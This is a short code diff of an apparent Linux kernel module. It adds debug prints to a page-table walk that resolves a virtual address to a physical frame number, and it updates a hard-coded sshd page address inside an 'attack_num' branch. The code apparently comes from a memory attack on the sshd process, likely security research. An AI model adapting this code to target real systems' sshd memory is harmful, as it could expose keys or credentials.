@@ -466,18 +466,24 @@ long get_pfn_of_virtual_address(unsigned long address, unsigned long * pfn)
 
 	//Get Page Global Dir.
 	pgd = pgd_offset(mm, address);
-	if (pgd_none(*pgd) || unlikely(pgd_bad(*pgd)))
-	return -EFAULT;
+	if (pgd_none(*pgd) || unlikely(pgd_bad(*pgd))) {
+    DbgPrint("Error: Get Page Global Dir.\n");
+	  return -EFAULT;
+	}
 
 	//Get Page Upper Dir.
 	pud = pud_offset(pgd, address);
-	if (pud_none(*pud) || unlikely(pud_bad(*pud)))
-	return -EFAULT;
+	if (pud_none(*pud) || unlikely(pud_bad(*pud))) {
+    DbgPrint("Error: Get Page Upper Dir.\n");
+		return -EFAULT;
+	}
 
 	// Get Page Middle Dir.
 	pmd = pmd_offset(pud, address);
-	if (pmd_none(*pmd))
-	return -EFAULT;
+	if (pmd_none(*pmd)) {
+    DbgPrint("Error: Get Page Middle Dir.\n");
+  	return -EFAULT;
+	}
 
 	// Get Page table entry, and get PFN from it:
 	ptep = pte_offset_map_lock(mm, pmd, address, &ptl);
@@ -762,7 +768,7 @@ if (attack_num < 2) {
 					down_read(&mm->mmap_sem);
 
 					// Currently hard-coded sshd page addr:
-					unsigned long sshd_page_addr = 0x7fbfa59cd000;
+					unsigned long sshd_page_addr = 0x7f2eb1fb8000;
 
 						ret = get_pfn_of_virtual_address(sshd_page_addr, &page_number);
 
